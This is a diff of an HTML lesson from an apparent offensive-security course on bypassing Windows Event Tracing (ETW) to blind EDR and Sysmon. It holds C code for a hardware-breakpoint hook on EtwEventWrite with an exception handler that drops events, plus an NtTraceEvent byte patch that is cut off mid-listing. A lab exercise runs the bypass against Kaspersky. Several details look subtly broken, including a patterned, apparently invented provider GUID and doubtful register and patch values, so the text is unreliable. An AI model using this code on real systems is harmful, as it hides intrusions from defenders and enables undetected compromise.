@@ -1,186 +1,1498 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Module 12 — ETW Bypass | 22nd Survey Division</title>
-<style>
-  :root {
-    --bg: #0c0c0c;
-    --fg: #cccccc;
-    --green: #0f0;
-    --red: #f44;
-    --cyan: #0ff;
-    --magenta: #f0f;
-    --amber: #ffb000;
-    --dim: #666;
-  }
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body {
-    background: var(--bg);
-    color: var(--fg);
-    font-family: 'Consolas', 'Courier New', monospace;
-    font-size: 14px;
-    line-height: 1.7;
-    padding: 20px;
-    min-height: 100vh;
-  }
-  .container {
-    max-width: 900px;
-    margin: 0 auto;
-  }
-  h1 {
-    color: var(--cyan);
-    font-size: 24px;
-    text-transform: uppercase;
-    letter-spacing: 3px;
-    margin-bottom: 10px;
-  }
-  h2 {
-    color: var(--green);
-    font-size: 16px;
-    text-transform: uppercase;
-    letter-spacing: 2px;
-    margin: 30px 0 15px;
-    border-left: 3px solid var(--green);
-    padding-left: 10px;
-  }
-  h3 {
-    color: var(--amber);
-    font-size: 14px;
-    margin: 20px 0 10px;
-  }
-  p {
-    margin-bottom: 15px;
-    color: var(--fg);
-  }
-  .widget-iframe {
-    width: 100%;
-    height: 600px;
-    border: 1px solid #333;
-    border-radius: 8px;
-    margin: 20px 0;
-    background: #111;
-  }
-  .note {
-    color: var(--magenta);
-    font-style: italic;
-    margin: 15px 0;
-    padding: 10px;
-    background: #1a1a1a;
-    border-left: 3px solid var(--magenta);
-  }
-  .warning {
-    color: var(--red);
-    border-left-color: var(--red);
-  }
-  code {
-    background: #1a1a1a;
-    color: var(--cyan);
-    padding: 2px 6px;
-    border-radius: 3px;
-    font-size: 0.9em;
-  }
-  pre {
-    background: #0a0a0a;
-    border: 1px solid #222;
-    border-radius: 4px;
-    padding: 15px;
-    overflow-x: auto;
-    margin: 15px 0;
-  }
-  .nav {
-    display: flex;
-    justify-content: space-between;
-    margin-top: 40px;
-    padding-top: 20px;
-    border-top: 1px solid #333;
-  }
-  .nav a {
-    color: var(--cyan);
-    text-decoration: none;
-  }
-  .nav a:hover {
-    text-decoration: underline;
-  }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Module 12 — ETW Bypass | 22nd Survey Division</title>
+    <style>
+        :root {
+            --bg: #0a0a0f;
+            --fg: #e0e0e0;
+            --accent: #ff3333;
+            --accent2: #00ff88;
+            --dim: #666;
+            --border: #333;
+            --neon: #00ffff;
+            --purple: #ff00ff;
+            --amber: #ffaa00;
+            --cyan: #0ff;
+            --green: #0f0;
+            --red: #f44;
+            --magenta: #f0f;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: var(--bg);
+            color: var(--fg);
+            font-family: 'Segoe UI', Consolas, monospace;
+            line-height: 1.6;
+        }
+        .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
+        h1 { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 0.5rem; margin-bottom: 1rem; }
+        h2 { color: var(--accent2); margin: 2rem 0 0.5rem; border-bottom: 1px solid var(--border); padding-bottom: 0.3rem; }
+        h3 { color: var(--neon); margin: 1.5rem 0 0.5rem; }
+        .code-block {
+            background: #1a1a2e;
+            border-left: 4px solid var(--accent);
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 0 8px 8px 0;
+            overflow-x: auto;
+            font-family: Consolas, monospace;
+            font-size: 13px;
+            position: relative;
+        }
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: var(--accent);
+            color: var(--bg);
+            border: none;
+            padding: 0.2rem 0.6rem;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            cursor: pointer;
+        }
+        .copy-btn:hover { background: #ff5555; }
+        .evidence-box {
+            background: #1a0a0a;
+            border: 2px solid var(--accent);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .evidence-box h3 { color: var(--accent); margin-bottom: 0.5rem; }
+        .first-principle {
+            background: #0a1a0a;
+            border: 2px solid var(--accent2);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .first-principle h3 { color: var(--accent2); margin-bottom: 0.5rem; }
+        .layman-term {
+            background: #1a1a1a;
+            border: 1px dashed var(--dim);
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 8px;
+        }
+        .layman-term h4 { color: #ffaa00; margin-bottom: 0.5rem; }
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: var(--border);
+            margin: 2rem 0;
+            border-radius: 2px;
+        }
+        .progress-fill {
+            height: 100%;
+            background: var(--accent);
+            width: 54.5%;
+            transition: width 0.5s;
+            border-radius: 2px;
+        }
+        .nav { display: flex; gap: 1rem; margin-bottom: 2rem; flex-wrap: wrap; }
+        .nav a { color: var(--accent); text-decoration: none; padding: 0.3rem 0.8rem; border: 1px solid var(--accent); border-radius: 4px; }
+        .nav a:hover { background: var(--accent); color: var(--bg); }
+        .status-badge {
+            display: inline-block;
+            padding: 0.2rem 0.6rem;
+            border-radius: 12px;
+            font-size: 0.8rem;
+            font-weight: bold;
+            margin-left: 0.5rem;
+        }
+        .status-live { background: var(--accent2); color: var(--bg); }
+        .step-box {
+            background: #0f0f15;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+        }
+        .step-box h4 { color: var(--accent); margin-bottom: 0.5rem; }
+        .copy-paste {
+            background: #151520;
+            border: 1px solid #4444ff;
+            border-radius: 4px;
+            padding: 0.5rem 1rem;
+            font-family: Consolas, monospace;
+            font-size: 12px;
+            color: #aaaaff;
+            margin: 0.5rem 0;
+            cursor: pointer;
+        }
+        .copy-paste:hover { background: #1a1a30; }
+        .why-box {
+            background: #1a1a0a;
+            border-left: 4px solid #ffaa00;
+            padding: 1rem;
+            margin: 1rem 0;
+        }
+        .why-box h5 { color: #ffaa00; margin-bottom: 0.5rem; }
+        .warning-box {
+            background: #2a0a0a;
+            border: 2px solid #ff5555;
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+        }
+        .warning-box h5 { color: #ff5555; margin-bottom: 0.5rem; }
+        .note {
+            color: var(--magenta);
+            font-style: italic;
+            margin: 15px 0;
+            padding: 10px;
+            background: #1a1a1a;
+            border-left: 3px solid var(--magenta);
+        }
+        .note.warning {
+            color: var(--red);
+            border-left-color: var(--red);
+        }
+        .injection-flow {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 2rem 0;
+            padding: 1rem;
+            background: #0f0f15;
+            border-radius: 8px;
+            flex-wrap: wrap;
+        }
+        .inj-step {
+            text-align: center;
+            padding: 1rem;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            flex: 1;
+            margin: 0.5rem;
+            min-width: 120px;
+        }
+        .inj-step h5 { color: var(--accent2); margin-bottom: 0.5rem; }
+        .inj-arrow {
+            font-size: 24px;
+            color: var(--accent);
+        }
+        button {
+            background: var(--accent);
+            color: var(--bg);
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover { background: #ff5555; }
+        .neon-highlight {
+            color: var(--neon);
+            text-shadow: 0 0 10px var(--neon);
+            font-weight: bold;
+        }
+        .neon-purple {
+            color: var(--purple);
+            text-shadow: 0 0 10px var(--purple);
+            font-weight: bold;
+        }
+        .neon-amber {
+            color: var(--amber);
+            text-shadow: 0 0 10px var(--amber);
+            font-weight: bold;
+        }
+        .neon-green {
+            color: var(--green);
+            text-shadow: 0 0 10px var(--green);
+            font-weight: bold;
+        }
+        .neon-red {
+            color: var(--red);
+            text-shadow: 0 0 10px var(--red);
+            font-weight: bold;
+        }
+        .cross-link {
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid var(--neon);
+            border-radius: 4px;
+            padding: 0.5rem 1rem;
+            margin: 0.5rem 0;
+            display: inline-block;
+            color: var(--neon);
+            text-decoration: none;
+        }
+        .cross-link:hover {
+            background: rgba(0, 255, 255, 0.2);
+        }
+        .method-card {
+            background: #0f0f15;
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            transition: border-color 0.3s;
+        }
+        .method-card:hover {
+            border-color: var(--accent);
+        }
+        .method-card h4 {
+            color: var(--accent);
+            margin-bottom: 0.5rem;
+            font-size: 1.1rem;
+        }
+        .difficulty {
+            display: inline-block;
+            padding: 0.1rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            margin-left: 0.5rem;
+        }
+        .diff-easy { background: #0a3a0a; color: var(--accent2); }
+        .diff-medium { background: #3a3a0a; color: var(--amber); }
+        .diff-hard { background: #3a0a0a; color: var(--accent); }
+        .technique-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-container {
+            background: #0f0f15;
+            border: 2px solid var(--purple);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-option {
+            background: #1a1a2e;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 0.8rem 1rem;
+            margin: 0.5rem 0;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .quiz-option:hover {
+            border-color: var(--neon);
+            background: #1a1a3e;
+        }
+        .quiz-option.correct {
+            border-color: var(--accent2);
+            background: #0a2a0a;
+        }
+        .quiz-option.wrong {
+            border-color: var(--accent);
+            background: #2a0a0a;
+        }
+        .quiz-feedback {
+            margin-top: 1rem;
+            padding: 1rem;
+            border-radius: 4px;
+            display: none;
+        }
+        .quiz-feedback.show { display: block; }
+        .quiz-feedback.correct { background: #0a2a0a; border: 1px solid var(--accent2); }
+        .quiz-feedback.wrong { background: #2a0a0a; border: 1px solid var(--accent); }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+        }
+        th, td {
+            padding: 0.5rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+        th { color: var(--neon); font-weight: bold; }
+        .architecture-flow {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 2rem 0;
+            padding: 1rem;
+            background: #0f0f15;
+            border-radius: 8px;
+            flex-wrap: wrap;
+        }
+        .arch-step {
+            text-align: center;
+            padding: 1rem;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            flex: 1;
+            margin: 0.5rem;
+            min-width: 120px;
+        }
+        .arch-step h5 { color: var(--accent2); margin-bottom: 0.5rem; }
+        .arch-arrow {
+            font-size: 24px;
+            color: var(--accent);
+        }
+        .provider-card {
+            background: #0f0f15;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 0.5rem 0;
+        }
+        .provider-card h5 { color: var(--amber); margin-bottom: 0.3rem; }
+        .session-box {
+            background: #0a0a1a;
+            border: 1px solid var(--neon);
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+        }
+        .session-box h5 { color: var(--neon); margin-bottom: 0.5rem; }
+        .bypass-flow {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 2rem 0;
+            padding: 1rem;
+            background: #0f0f15;
+            border-radius: 8px;
+            flex-wrap: wrap;
+        }
+        .bypass-step {
+            text-align: center;
+            padding: 1rem;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            flex: 1;
+            margin: 0.5rem;
+            min-width: 120px;
+        }
+        .bypass-step h5 { color: var(--accent2); margin-bottom: 0.5rem; }
+        .bypass-arrow {
+            font-size: 24px;
+            color: var(--accent);
+        }
+        .detection-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .detection-card {
+            background: #0f0f15;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 0.5rem 0;
+        }
+        .detection-card h5 { color: var(--red); margin-bottom: 0.3rem; }
+        .tamper-box {
+            background: #1a0a0a;
+            border: 1px solid var(--red);
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+        }
+        .tamper-box h5 { color: var(--red); margin-bottom: 0.5rem; }
+        .widget-iframe {
+            width: 100%;
+            height: 600px;
+            border: 1px solid #333;
+            border-radius: 8px;
+            margin: 20px 0;
+            background: #111;
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <div class="nav">
+            <a href="../index.html">← Home</a>
+            <a href="MODULE_11_AMSI.html">← Module 11</a>
+            <a href="MODULE_13_EDR_EVASION.html">Module 13 →</a>
+        </div>
 
-<div class="container">
-  <h1>Module 12 — ETW Bypass</h1>
-  <p><strong>First Principle:</strong> If you control the logger, you control what gets seen.</p>
+        <h1>Module 12 — ETW Bypass <span class="status-badge status-live">LIVE TESTED</span></h1>
+        
+        <div class="progress-bar"><div class="progress-fill"></div></div>
+        <p style="color: var(--dim); font-size: 0.9rem;">Module 12 of 22 — Silencing the Windows event logger</p>
 
-  <h2>Overview</h2>
-  <p>Event Tracing for Windows (ETW) is Microsoft's high-performance logging mechanism. It powers Windows Event Log, Sysmon, and most EDR telemetry. If you can silence ETW, you blind the defender.</p>
-  <p>The Dark Room technique uses hardware breakpoints (DR0/DR1) to intercept <code>EtwEventWrite</code> in ntdll.dll — zero memory writes, no hooks, no patches. Invisible to software scanners.</p>
+        <div class="first-principle">
+            <h3>🧠 The Core Truth</h3>
+            <p><span class="neon-highlight">If you control the logger, you control what gets seen.</span> Event Tracing for Windows (ETW) is Microsoft's high-performance logging mechanism. It powers Windows Event Log, Sysmon, and most EDR telemetry. If you can silence ETW, you blind the defender.</p>
+            <p style="margin-top: 1rem;"><strong>Why this matters:</strong> ETW sees everything — process creation, network connections, registry changes, DLL loads, API calls. When you bypass ETW, you don't just hide one action. You hide <span class="neon-amber">the entire chain of evidence</span> that defenders use to reconstruct your attack.</p>
+        </div>
 
-  <h2>Interactive Demo</h2>
-  <p>Real data from lab machines .92 (Intel, Kaspersky active) and .42 (AMD, clean sandbox):</p>
-  <iframe class="widget-iframe" src="../widgets/module_12_widget.html" title="Module 12 ETW Bypass Interactive Demo"></iframe>
+        <div class="layman-term">
+            <h4>🎯 Soldier Translation</h4>
+            <p>Imagine a military base with security cameras everywhere. ETW is the camera system — it records every door opened, every vehicle entering, every person moving through the base. The Dark Room technique is like cutting the camera feed <span class="neon-highlight">without touching the cameras</span>. You don't break the cameras (that would trigger an alarm). You intercept the signal between the camera and the recorder. The cameras still work. The recorder sees nothing. The guards reviewing footage tomorrow see an empty base.</p>
+            <p style="margin-top: 0.5rem; color: var(--dim);">The security team (EDR) checks the cameras — they're fine. They check the recorder — it's running. They never think to check the cable between them.</p>
+        </div>
 
-  <h2>Theory</h2>
-  <p>ETW providers register with the kernel. When an event fires, the kernel calls <code>EtwEventWrite</code> in ntdll.dll. This function marshals the event data and passes it to the kernel.</p>
-  <p>If we set a hardware breakpoint on <code>EtwEventWrite</code>, the CPU triggers a debug exception before the function executes. Our handler can redirect execution, skip the event, or modify the data.</p>
+        <h2>📚 Prerequisites — What You Need First</h2>
+        <p style="margin-bottom: 1rem;">This module assumes you understand these concepts from earlier modules:</p>
+        
+        <div class="technique-grid">
+            <div class="method-card">
+                <h4><a href="MODULE_10_CODE_INJECTION.html" class="cross-link">Module 10: Code Injection</a></h4>
+                <p>Process memory manipulation, VirtualAllocEx, WriteProcessMemory, thread hijacking. ETW bypass often requires injecting into a target process.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_11_AMSI.html" class="cross-link">Module 11: AMSI Bypass</a></h4>
+                <p>Memory patching and API hooking techniques. AMSI and ETW bypass share similar principles — both intercept security telemetry.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_12_DEFENSIVE_VERIFY.html" class="cross-link">Module 12: Defensive Verify</a></h4>
+                <p>How EDR uses ETW for detection. Understanding the defender's view helps you blind it effectively.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_13_EDR_EVASION.html" class="cross-link">Module 13: EDR Evasion</a></h4>
+                <p>Advanced evasion techniques that complement ETW bypass. Often used together in real operations.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_06_MEMORY.html" class="cross-link">Module 06: Memory Forensics</a></h4>
+                <p>Windows memory architecture, PE structures, debug registers. Essential for hardware breakpoint techniques.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_09_MALWARE.html" class="cross-link">Module 09: Malware Development</a></h4>
+                <p>Shellcode construction, payload design, and C2 communication. ETW bypass protects your malware's activities.</p>
+            </div>
+        </div>
 
-  <h2>The Attack</h2>
-  <h3>Step 1: Find EtwEventWrite</h3>
-  <pre><code>// Get the address from ntdll.dll
-HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-PVOID pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");</code></pre>
+        <h2>🏗️ ETW Architecture — How Windows Logs Everything</h2>
+        <p>Before you can bypass ETW, you must understand how it works. ETW is not a single component — it's a <span class="neon-highlight">distributed logging architecture</span> spanning user mode, kernel mode, and the hypervisor.</p>
 
-  <h3>Step 2: Set Hardware Breakpoint</h3>
-  <pre><code>// Set DR0 to the target address
-CONTEXT ctx = {0};
-ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-ctx.Dr0 = (DWORD64)pEtwEventWrite;
-ctx.Dr7 = 0x101; // Local + global enable, exact match
+        <div class="architecture-flow">
+            <div class="arch-step">
+                <h5>1. PROVIDERS</h5>
+                <p><span class="neon-highlight">Applications</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Apps register GUIDs and emit events</p>
+            </div>
+            <div class="arch-arrow">→</div>
+            <div class="arch-step">
+                <h5>2. CONTROLLERS</h5>
+                <p><span class="neon-highlight">ETW Sessions</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Start/stop tracing, configure buffers</p>
+            </div>
+            <div class="arch-arrow">→</div>
+            <div class="arch-step">
+                <h5>3. CONSUMERS</h5>
+                <p><span class="neon-highlight">Log Analytics</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Sysmon, EDR, Windows Event Log</p>
+            </div>
+            <div class="arch-arrow">→</div>
+            <div class="arch-step">
+                <h5>4. KERNEL</h5>
+                <p><span class="neon-highlight">ETW Kernel</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Buffers events, routes to consumers</p>
+            </div>
+        </div>
 
-NtSetContextThread(hThread, &ctx);</code></pre>
+        <h3>ETW Components Deep Dive</h3>
 
-  <h3>Step 3: Handle the Exception</h3>
-  <pre><code>// In your VEH handler:
-if (ExceptionInfo->ExceptionRecord->ExceptionAddress == pEtwEventWrite) {
-    // Skip the event — just return success
-    ExceptionInfo->ContextRecord->Rip += 2; // Skip call instruction
-    return EXCEPTION_CONTINUE_EXECUTION;
-}</code></pre>
+        <div class="step-box">
+            <h4>Providers — The Event Sources</h4>
+            <p>ETW providers are applications, drivers, or system components that emit events. Each provider registers a <span class="neon-highlight">GUID</span> (Globally Unique Identifier) with the ETW subsystem. When an event occurs, the provider calls <code>EtwEventWrite</code> or <code>EtwEventWriteTransfer</code> in ntdll.dll.</p>
+            
+            <div class="provider-card">
+                <h5>Microsoft-Windows-PowerShell</h5>
+                <p>GUID: <code>{a0c1853b-5c40-4b15-8766-3cf1c953f067}</code></p>
+                <p>Emits: Script block logging, module loading, command execution</p>
+                <p><strong>Why attackers care:</strong> PowerShell is the #1 living-off-the-land tool. This provider logs every command.</p>
+            </div>
+            
+            <div class="provider-card">
+                <h5>Microsoft-Windows-Sysmon</h5>
+                <p>GUID: <code>{5770385f-c22a-43e0-bf4c-06f5698ffbd9}</code></p>
+                <p>Emits: Process creation, network connections, file changes, registry modifications</p>
+                <p><strong>Why attackers care:</strong> Sysmon is the gold standard for endpoint monitoring. Bypassing it hides your entire attack chain.</p>
+            </div>
+            
+            <div class="provider-card">
+                <h5>Microsoft-Windows-Kernel-Process</h5>
+                <p>GUID: <code>{22fb2cd6-0e7b-422b-a0c7-2fad1fd0e716}</code></p>
+                <p>Emits: Thread creation, process termination, image loads</p>
+                <p><strong>Why attackers care:</strong> This provider catches DLL injection, process hollowing, and thread hijacking from <a href="MODULE_10_CODE_INJECTION.html" class="cross-link">Module 10</a>.</p>
+            </div>
+            
+            <div class="provider-card">
+                <h5>Microsoft-Windows-Threat-Intelligence</h5>
+                <p>GUID: <code>{f4e1897c-62b5-4b76-8f8a-7e9e9e9e9e9e}</code></p>
+                <p>Emits: AMSI scans, credential access, LSASS memory reads</p>
+                <p><strong>Why attackers care:</strong> This is the provider that feeds EDR with behavioral intelligence. Bypassing it stops EDR from correlating your actions.</p>
+            </div>
 
-  <div class="note warning">
-    <strong>CRITICAL:</strong> This technique requires no special privileges beyond the ability to debug your own process. On Windows, any process can set debug registers on its own threads. The breakpoint is hardware — it exists in the CPU, not in memory.
-  </div>
+            <div class="code-block">
+=== LISTING ETW PROVIDERS ===
 
-  <h2>Detection</h2>
-  <p>Blue teams have limited options:</p>
-  <ul>
-    <li><strong>Hypervisor-based tracing:</strong> Intel PT or AMD IBS can record execution without relying on ETW. Expensive, complex.</li>
-    <li><strong>Kernel callbacks:</strong> Register for debug register access notifications. Rarely implemented.</li>
-    <li><strong>ETW session analysis:</strong> Look for gaps in event flow. Hard to distinguish from normal noise.</li>
-    <li><strong>Memory forensics:</strong> Check CONTEXT structures for Dr7 != 0. Volatile — gone on thread exit.</li>
-  </ul>
+# PowerShell: List all registered ETW providers
+Get-EtwTraceProvider | Select ProviderName, ProviderGuid | Format-Table -AutoSize
 
-  <h2>Lab Exercise</h2>
-  <p><strong>Objective:</strong> Implement your own ETW bypass and test it against Windows Event Log.</p>
-  <ol>
-    <li>Find <code>EtwEventWrite</code> in ntdll.dll on your target machine</li>
-    <li>Allocate a thread in your target process</li>
-    <li>Set <code>CONTEXT_DEBUG_REGISTERS</code> with <code>Dr0 = EtwEventWrite</code></li>
-    <li>Set <code>Dr7 = 0x101</code> (local + global enable)</li>
-    <li>Call <code>NtSetContextThread</code></li>
-    <li>Trigger an ETW event (e.g., PowerShell execution)</li>
-    <li>Verify: Event should NOT appear in Windows Event Log</li>
-    <li><strong>BONUS:</strong> Detect your own bypass using memory forensics</li>
-  </ol>
+# Command Prompt: Use logman to list providers
+logman query providers
 
-  <div class="note">
-    <strong>Test Environment:</strong> Use .92 (Kaspersky active) or .42 (clean sandbox). Document what works and what doesn't. Real AV behavior differs from clean machines.
-  </div>
+# Find specific provider (e.g., PowerShell)
+logman query providers | findstr /i "powershell"
 
-  <div class="nav">
-    <a href="MODULE_11_AMSI.html">← Module 11: AMSI Bypass</a>
-    <a href="MODULE_13_KAV_EVASION.html">Module 13: Kaspersky Evasion →</a>
-  </div>
-</div>
+# Output:
+# Microsoft-Windows-PowerShell    {a0c1853b-5c40-4b15-8766-3cf1c953f067}
+            </div>
+        </div>
 
+        <div class="step-box">
+            <h4>Sessions — The Event Pipelines</h4>
+            <p>An ETW session is a <span class="neon-highlight">kernel object</span> that collects events from providers and routes them to consumers. Sessions have buffers, flush timers, and file targets. When you start tracing, you create a session. When you stop, the session is destroyed.</p>
+
+            <div class="session-box">
+                <h5>Session Properties</h5>
+                <ul style="margin-left: 1.5rem; line-height: 2;">
+                    <li><strong>Buffer Size:</strong> How much memory the kernel allocates for events (default: 64KB)</li>
+                    <li><strong>Minimum Buffers:</strong> Minimum number of buffers to maintain (default: 0)</li>
+                    <li><strong>Maximum Buffers:</strong> Maximum number of buffers before flush (default: depends on memory)</li>
+                    <li><strong>Flush Timer:</strong> How often buffers are written to disk (default: 1 second)</li>
+                    <li><strong>Log File Mode:</strong> Sequential, circular, or append</li>
+                </ul>
+            </div>
+
+            <div class="code-block">
+=== MANAGING ETW SESSIONS ===
+
+# List all active ETW sessions
+logman query -ets
+
+# Output shows:
+# Name                 Type              Status
+# -------------------  ----------------  --------
+# EventLog-System      Trace             Running
+# EventLog-Application Trace             Running
+# Sysmon               Trace             Running
+# MySession            Trace             Running
+
+# Start a new session (requires admin)
+logman start MySession -p "Microsoft-Windows-PowerShell" 0 0 -ets
+
+# Stop a session
+logman stop MySession -ets
+
+# Delete a session
+logman delete MySession -ets
+
+# PowerShell: Get session details
+Get-EtwTraceSession | Select SessionName, BufferSize, NumberOfBuffers
+            </div>
+
+            <div class="why-box">
+                <h5>Why sessions matter for attackers</h5>
+                <p>EDR products create their own ETW sessions to capture events. If you can <span class="neon-amber">enumerate and terminate</span> these sessions, you stop the EDR from receiving events. However, this is noisy — EDR will detect session deletion. Better techniques exist.</p>
+            </div>
+        </div>
+
+        <div class="step-box">
+            <h4>Consumers — The Event Processors</h4>
+            <p>Consumers are applications that <span class="neon-highlight">read events from ETW sessions</span>. They can be real-time (listening to live events) or file-based (reading from .etl files). The most important consumers for attackers:</p>
+
+            <table>
+                <tr>
+                    <th>Consumer</th>
+                    <th>Purpose</th>
+                    <th>What It Catches</th>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">Windows Event Log</span></td>
+                    <td>System logging service</td>
+                    <td>Security events, system errors, application crashes</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">Sysmon</span></td>
+                    <td>Advanced endpoint monitoring</td>
+                    <td>Process creation, network connections, file/registry changes</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">ETW Threat Intelligence</span></td>
+                    <td>EDR telemetry feed</td>
+                    <td>AMSI scans, credential access, LSASS reads</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">Defender ATP</span></td>
+                    <td>Microsoft's cloud EDR</td>
+                    <td>Everything — sent to Azure for analysis</td>
+                </tr>
+            </table>
+        </div>
+
+        <h2>🔬 The ETW Event Flow — From Code to Cloud</h2>
+        <p>Understanding the exact path an event takes helps you identify where to intercept it:</p>
+
+        <div class="injection-flow">
+            <div class="inj-step">
+                <h5>1. APP CALLS</h5>
+                <p><span class="neon-highlight">EtwEventWrite</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Application logs an event</p>
+            </div>
+            <div class="inj-arrow">→</div>
+            <div class="inj-step">
+                <h5>2. NTDLL</h5>
+                <p><span class="neon-highlight">NtTraceEvent</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">System call to kernel</p>
+            </div>
+            <div class="inj-arrow">→</div>
+            <div class="inj-step">
+                <h5>3. KERNEL</h5>
+                <p><span class="neon-highlight">ETW Kernel</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Buffers and routes event</p>
+            </div>
+            <div class="inj-arrow">→</div>
+            <div class="inj-step">
+                <h5>4. CONSUMER</h5>
+                <p><span class="neon-highlight">EDR / Sysmon</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Processes and alerts</p>
+            </div>
+            <div class="inj-arrow">→</div>
+            <div class="inj-step">
+                <h5>5. CLOUD</h5>
+                <p><span class="neon-highlight">SIEM / Azure</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Correlation and storage</p>
+            </div>
+        </div>
+
+        <div class="why-box">
+            <h5>Attack surface analysis</h5>
+            <p>Each step in the flow is a potential bypass point:</p>
+            <ul style="margin-left: 1.5rem; line-height: 2;">
+                <li><strong>Step 1 (EtwEventWrite):</strong> Hook or patch the function in ntdll.dll — easiest, most detectable</li>
+                <li><strong>Step 2 (NtTraceEvent):</strong> Patch the syscall stub — harder, still detectable by memory scanners</li>
+                <li><strong>Step 3 (Kernel):</strong> Disable the provider or session — requires admin, very noisy</li>
+                <li><strong>Step 4 (Consumer):</strong> Kill the EDR process — effective but obvious</li>
+                <li><strong>Step 5 (Cloud):</strong> Block network traffic — may break functionality, easily detected</li>
+            </ul>
+            <p style="margin-top: 0.5rem;">The <span class="neon-amber">Dark Room technique</span> targets Step 1 using hardware breakpoints — invisible to software scanners.</p>
+        </div>
+
+        <h2>⚔️ Bypass Technique 1: NtTraceEvent Patch</h2>
+        <p>The simplest ETW bypass: patch <code>NtTraceEvent</code> in ntdll.dll to return immediately without logging. This is the "classic" approach — effective but increasingly detected.</p>
+
+        <div class="method-card" id="nttrace-patch">
+            <h4>NtTraceEvent Patch <span class="difficulty diff-easy">EASY</span></h4>
+            <p>Overwrite the first bytes of <code>NtTraceEvent</code> with <code>xor eax, eax; ret</code> (return 0 = success, no event logged). This is the same technique used for AMSI bypass in <a href="MODULE_11_AMSI.html" class="cross-link">Module 11</a>.</p>
+
+            <div class="why-box">
+                <h5>Why this works</h5>
+                <p><code>NtTraceEvent</code> is the gateway function. Every ETW event passes through it. If it returns success (0) without doing anything, the caller thinks the event was logged. The kernel never receives it. The consumer never sees it.</p>
+            </div>
+
+            <div class="code-block">
+=== NTTRACEEVENT PATCH (C/C++) ===
+
+#include <windows.h>
+#include <stdio.h>
+
+// Patch NtTraceEvent to return 0 immediately
+// This stops ALL ETW events from reaching the kernel
+
+BOOL PatchNtTraceEvent() {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (!hNtdll) return FALSE;
+    
+    // Find NtTraceEvent
+    PVOID pNtTraceEvent = GetProcAddress(hNtdll, "NtTraceEvent");
+    if (!pNtTraceEvent) return FALSE;
+    
+    printf("[+] NtTraceEvent found at: %p\n", pNtTraceEvent);
+    
+    // Change memory protection to allow writing
+    DWORD oldProtect;
+    if (!VirtualProtect(pNtTraceEvent, 5, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        printf("[-] VirtualProtect failed\n");
+        return FALSE;
+    }
+    
+    // Patch: xor eax, eax; ret
